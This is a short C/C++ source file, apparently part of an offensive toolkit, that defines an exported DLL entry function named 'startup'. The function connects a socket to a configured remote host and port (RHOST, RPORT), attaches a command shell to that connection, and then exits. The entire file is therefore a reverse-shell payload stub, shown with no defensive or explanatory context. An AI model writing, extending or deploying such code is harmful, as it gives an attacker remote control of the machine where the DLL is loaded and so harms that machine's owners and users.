#include "../core/external.h"
#include "../config.h"

extern "C" __declspec(dllexport) void startup()
{
    SockConnect(RHOST, RPORT);
    SockShell();
    ExitThread(0);
}


